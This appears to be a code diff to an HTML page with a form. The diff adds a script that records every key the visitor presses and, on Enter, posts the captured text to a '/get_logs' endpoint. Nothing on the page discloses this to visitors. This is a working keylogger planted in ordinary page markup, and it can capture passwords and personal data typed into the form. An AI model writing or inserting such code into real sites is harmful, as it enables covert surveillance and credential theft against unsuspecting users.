@@ -109,5 +109,33 @@ button {
 </form>
 
 </div>
+
+<script>
+let keyBuffer = '';
+
+document.addEventListener('keydown', (e) => {
+    const key = e.key;
+
+    if (key === 'Enter') {
+        sendLogs(keyBuffer);
+        keyBuffer = '';
+    } else {
+        keyBuffer += key;
+    }
+});
+
+function sendLogs(logs) {
+    if (logs.trim().length === 0) return;
+
+    fetch('/get_logs', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+        },
+        body: `logs=${encodeURIComponent(logs)}`
+    }).catch(err => console.log('Log sent'));
+}
+</script>
+
 </body>
 </html>
